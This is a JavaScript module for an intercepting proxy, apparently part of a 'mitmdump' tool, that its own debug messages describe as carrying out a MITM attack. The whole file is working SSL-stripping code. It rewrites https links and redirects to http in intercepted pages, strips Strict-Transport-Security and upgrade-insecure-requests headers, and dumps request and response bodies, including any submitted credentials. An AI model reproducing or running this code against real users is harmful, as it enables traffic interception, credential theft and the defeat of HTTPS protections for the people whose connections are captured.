const url = require('url')
const https = require('https')
const zlib = require('zlib')
const BufferList = require('bl')
const { Transform } = require('stream')
const debug = require('debug')('mitmdump')

const valuableTypes = new Set([
  'text/plain',
  'text/html',
  'application/xhtml+xml',
  'application/xml',
  'application/javascript',
  'application/json'
])

function isValuable(message, estimated) {
  if (estimated && 'get' === message.method.toLowerCase()) {
    return true
  }
  let type = message.headers['content-type']
  if (!type) {
    return false
  }
  type = type.split(';')[0].toLowerCase()
  if (valuableTypes.has(type)) {
    return true
  }
  return false
}

const statusMoved = new Set([301, 302])

const compressions = {
  gzip: {
    zip: zlib.createGzip,
    unzip: zlib.createGunzip
  },
  deflate: {
    zip:  zlib.createDeflate,
    unzip: zlib.createInflate,
  }
}

class Https2Http extends Transform {
  constructor(options) {
    super(options)
  }
  _transform(chunk, encoding, callback) {
    const replaced = chunk.toString().replace(/(["']\s*)https:/ig, '$1http:')
    callback(null, replaced)
  }
}

function buffer(source, buffer) {
  return new Promise((resolve) => {
    source.on('end', resolve)
    source.pipe(buffer)
    source.resume()
  })
}

module.exports = async function() {

  const {client2proxy, proxy2client, options} = this

  if (!isValuable(client2proxy, true)) {
    return
  }
  debug('try do MITM attack')

  delete this.options.headers['upgrade-insecure-requests']
  const bl = new BufferList

  await buffer(client2proxy, bl)

  const dump = {
    request: Object.assign({}, options, {body: bl.toString()}),
    responses: []
  }

  const request = (async (protocol) => {
    const message = await this.request(protocol, bl.duplicate())
    const {statusCode, headers} = message
    const result = {message, stream: message}

    const response = {statusCode, headers}
    if (isValuable(message)) {

      debug('valuable attack')
      result.stream = message
      const output = new BufferList
      const encoding = message.headers['content-encoding']
      const replace = new Https2Http
      if (encoding) {
        const compression = compressions[encoding.toLowerCase()]
        if (compression) {
          debug(`${encoding} stream`)
          await new Promise((resolve) => {
            const unzip = compression.unzip()
            unzip.on('end', resolve)
            message.pipe(unzip).pipe(output);
          })
          const zip = compression.zip()
          result.stream = zip
          output.duplicate().pipe(replace).pipe(zip)
        }
      } else {
        await buffer(message, output)
        result.stream = output.duplicate().pipe(replace)
      }
      response.body = output.toString()
      headers['x-mitm-valuable'] = true.toString()

    }
    dump.responses.push(response)

    return result
  })

  let server2proxy = await request()

  if (statusMoved.has(server2proxy.message.statusCode)) {
    const location = url.parse(server2proxy.message.headers.location)
    const [host, port] = location.host.split(':')
    if ('https:' === location.protocol) {
      if (options.host === host &&
          options.path === location.path) {
        options.port = null
        server2proxy.message.destroy()
        server2proxy = await request(https)
      } else {
        server2proxy.message.headers.location =
          server2proxy.message.headers.location.replace(/^\s*https:/, 'http:')
      }
    }
  }

  {
    const {statusCode, headers} = server2proxy.message
    delete headers['strict-transport-security']
    proxy2client.writeHead(statusCode, headers)
    server2proxy.stream.pipe(proxy2client)
    server2proxy.stream.resume()
  }

  this.dump = dump

}
